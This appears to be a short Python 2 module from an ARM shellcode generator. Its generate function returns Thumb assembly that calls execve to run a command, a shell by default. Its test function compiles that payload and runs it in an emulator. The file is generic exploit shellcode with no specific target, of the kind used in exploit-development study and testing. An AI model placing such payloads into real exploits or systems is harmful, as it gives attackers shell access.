def generate(cmd='/bin/sh'):
    """Executes cmd

    Args:
        cmd(str): executes cmd (default: ``/bin/sh``)
    """
    sc = """
    mov  r0, pc
    add  r0, #11
    add  r0, r0, #1
    sub r2, r2
    movs r7, #(0+ 11)
    push {r0, r2}
    mov  r1, sp
    svc  1
bin_sh_1:
    .asciz "%s\x00"
    """ % (cmd)
    return sc

def testcase(cmd='/bin/sh'):
    import ARMSCGen as scgen
    scgen.prepareCompiler('THUMB')
    sc = scgen.CompileSC(generate(cmd), isThumb=True)
    sclen = sc.find(cmd)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
